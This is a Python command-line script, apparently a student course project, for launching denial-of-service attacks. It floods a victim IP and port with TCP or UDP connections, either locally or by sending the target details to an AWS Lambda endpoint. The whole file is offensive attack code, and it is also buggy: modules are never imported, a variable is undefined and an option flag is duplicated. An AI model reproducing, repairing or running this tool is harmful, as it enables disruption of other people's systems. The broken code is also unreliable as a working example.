import click
import json
import requests

# Configure CLI options
@click.command()
@click.option('--aws', help='Use AWS Lambda to perform the attack', is_flag=True)
@click.option('-p', '--protocol', default='udp', type=click.Choice(['udp', 'tcp']),
			  help='Protocol to use for attack')
@click.option('-i', '--ip', required=True, help='Global IP address of victim')
@click.option('-p', '--port', default=80, type=int, help='Target port on victim\'s machine')
@click.option('-t', '--time', default=7, type=int, help='Number of seconds to attack for. Max of 15.')


# Entry function from CLI
def ddos(aws, protocol, ip, port, time):
	# if aws:
	# 	print('AWS!')

	# 	if protocol == 'udp':
	# 		response = requests.get("https://295m1151n5.execute-api.us-east-1.amazonaws.com/default/cs460-project")

	# 	else:
	# 		response = requests.get("https://73bjserpgd.execute-api.us-east-1.amazonaws.com/default/cs460-project-tcp")

	# 	print(response.status_code)
	# 	print(response.json())
	t = min(time, 15)

	if aws:
		resp = aws_attack(protocol, ip, port, time)
		print(resp)
		print(resp.json())
		# print(resp.)

	else:
		local_attack(protocol, ip, port, time)


# def syn_flood(target_ip, port, t):

def local_attack(protocol, ip, port, t):
	attack = 'SYN flood' if (protocol == 'tcp') else 'UDP flood'
	print('Commencing %s attack for %d seconds...\n' % (attack, t))

	begin = time.time()
	count = 0

	# Loop to continuously send packets
	while True:

		end = time.time()

		# Check for attack lasting a specific length
		if end - begin > t:
			print("Sent %d packets" % count)
			exit()

		# Send Packets
		if protocol == 'tcp':
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		else:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			except:
				pass

		s.connect((target_ip, port))
		count = count + 1


def aws_attack(protocol, ip, port, t):
	# response = requests.get("https://73bjserpgd.execute-api.us-east-1.amazonaws.com/default/cs460-project-tcp")
	# This is absolutely disgusting but it works
	headers = { 'data': str(ip) + ' ' + str(port) + ' ' + protocol + ' ' + str(t) }
	# headers = [ip, port]
	# print(headers)

	url = "https://295m1151n5.execute-api.us-east-1.amazonaws.com/default/cs460-project"
	response = requests.get(url, headers=headers)
	return response


ddos()
